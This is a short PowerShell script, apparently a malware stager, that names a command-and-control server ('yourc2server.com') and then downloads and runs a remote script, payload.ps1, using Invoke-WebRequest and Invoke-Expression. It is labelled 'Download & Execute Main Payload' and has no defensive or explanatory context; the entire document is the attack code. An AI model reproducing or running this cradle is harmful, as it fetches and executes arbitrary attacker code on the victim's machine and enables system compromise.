$C2Server = "https://yourc2server.com"

# **Download & Execute Main Payload**
$Payload = Invoke-WebRequest -Uri "$C2Server/payload.ps1" -UseBasicParsing
Invoke-Expression $Payload
